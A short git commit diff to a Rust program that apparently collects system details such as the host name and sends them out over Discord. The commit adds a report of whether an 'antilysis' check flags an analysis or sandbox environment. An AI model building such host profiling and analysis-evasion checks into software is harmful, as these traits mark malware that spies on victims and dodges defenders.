d0833af5d3b80df0d0d46c372edab2a33462cc22
User <user@debian-BULLSEYE-live-builder-AMD64>
2023-08-30 15:23:47 +0200

    Uses antilysis

--- src/main.rs
+++ src/main.rs
@@ -9,6 +9,8 @@ use serenity::{
 use std::env;
 use sysinfo::{System, SystemExt};
 
+use antilysis;
+
 mod consts;
 
 #[tokio::main]
@@ -31,6 +33,10 @@ async fn main() {
     sysinfo.push_str(&format!(
         "System host name:        {}\n",
         unwrap_string(sys.host_name())
+    ));
+    sysinfo.push_str(&format!(
+        "Flagged by antilysis:    {}\n",
+        if antilysis::detected() {"yes"} else {"no"}
     ));
 
     send(sysinfo).await.unwrap();
